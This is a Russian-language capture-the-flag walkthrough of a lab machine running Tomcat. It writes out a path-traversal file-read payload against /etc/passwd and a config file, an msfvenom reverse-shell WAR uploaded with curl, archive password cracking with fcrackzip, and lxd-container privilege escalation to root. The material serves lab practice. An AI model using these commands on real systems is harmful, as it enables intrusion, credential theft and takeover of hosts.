Дисклеймер.  
Все инструменты описанные в данной статье реальны, находятся в свободном доступе и используются специалистами по Информационной Безопасности для проведения тестирования на проникновение информационных систем компаний и предприятий. Автор статьи не занимается взломом и не поощряет подобных действий, все описанное ниже было выполнено на специально подготовленной для этого виртуальной машине.

Снова легкая виртуалка, потому что…. потому что не хочется вляпаться в реверсивную инженерию или какой-нибудь WAF, короче…. сканируем порты….

```bash
 Nmap scan report for 10.10.10.194

 Host is up (0.12s latency).

 Not shown: 997 closed ports

 PORT STATE SERVICE VERSION
 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
 80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
 |_http-title: Mega Hosting
 8080/tcp open http Apache Tomcat
 |_http-title: Apache Tomcat
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

окей, у нас есть [[ssh]] и вебчик, штука под [[tomcat]] значит использует Java как двигатель прогресса. Запускаем [[gobuster]] в фоне, и идем смотреть на сайт сами, нам сразу в глаза тычут доменным именем сайта. окей, идем записываем его в etc/hosts, обновляем страницу, вдруг есть виртуальная маршрутизация, неа, ничего не изменилось. значит будем смотреть один сайт, открываем все ссылки на свете. ссылка на новости ведет на страницу с параметром **file=statement** как удачно, можно попробовать [[Local File Inclusion]], учитывая то, что nmap нам сказал что это Ubuntu 4 будем искать **/etc/passwd** потому что он есть 100%. Рисуем кучу директорий вниз и меняем параметр на это file=**../../../../../../../../../../etc/passwd**

мы победили, файл открылся,что делать дальше…

пойдем читать новости, они говорят что что-то переехало на более безопасный сервер, окей безопаснее [[http]] может быть [[https]] дефолтный порт 8080 пойдем попробуем.

ии, мы попали… страница требует логин, сначала пробуем дефолтный набор, потом сдаемся…. страница выдает 401, что ожидаемо и сама отдает нам путь к конфигу в котором лежат юзеры, а у нас есть [[Local File Inclusion]], го смотреть.  
получаем логин пароль, он подходит, но это тупо api админки,нужно попробовать загрузить шеллкод.

так как все это вертится на Java используем [[metasploit#msfvenom]] чтобы создать полезную нагрузку.

 ```bash
msfvenom -p java_jsp_shell_reverce_tcp LHOST=<наш ip на tun0> LPORT=1234 -f war > shell.war
```

и так, payload имеется осталось его сгрузить [[curl]] нам в этом поможет

```bash
curl -u 'tomcat:password' -T shell.war «url»
```

видим OK

запускаем [[netcat]] на порт 1234 и в браузер

заходим на появившуюся страницу shell.war, не знаю, откуда она там взялась) и получаем shell

курим папочки находим архив с бэкапами ух-ты запароленый, а ну давай [[fcrackzip]]

```bash
 fcrackzip -D -p /usr/share/wordlists/rockyou.txt backup.zip
```

ждемс… опа паролик, так, бекапы теперь не интересны, сходим /home посмотрим пользователя, есть ash

а ну ка…

```bash
 su ash
```

О, теперь я ash а ну **cat user.txt** и на борду сдавать

осталось вкурить в pivesc,пробуем

```bash
 sudo -l
```

я не в sudoers???

окей, а кто еще есть?

```bash
id
```

lxd, системные контейнеры не могут быть не от рута, пойдем нарисуем себе контейнер

гуглим apline-builder получаем github [[alpine]]

> git clone https://github.com/saghul/lxd-alpine-builder

запускаем скачанную дичь, пусть создает образ контейнера

архив есть, поднимаем на нашей тачке веб сервер

с удаленной wget

импорт того что мы создали
[[lxc]]

```bash
 lxc image import ./*название архива* --alias goodpc
```

проверяем импорт

```bash
lxc image list
```

все круто, инициализируем образ

```bash
 lxc init goodpc privesc -c security.privileged=true
```

Что? Ошибка? нет пула памяти? гуглим.
 ```bash 
lxd init
```


далее по принципу установки да-да-да, запускай

повторяем…. вышло…

создадим виртуальный диск в контейнере

```bash
lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true
```
готово, запускаемся

```bash
 lxc start privesc

 lxc exec privesc /bin/sh
```

и у нас есть root доступ, выглядит кншн не оч… но работает же..

осталось найти root.txt

он в папке с нашим диском, мы вмонтировали его туда

```bash
 cd /mnt/root/root

cat root.txt
```

Сдаем флаг и радуемся жизни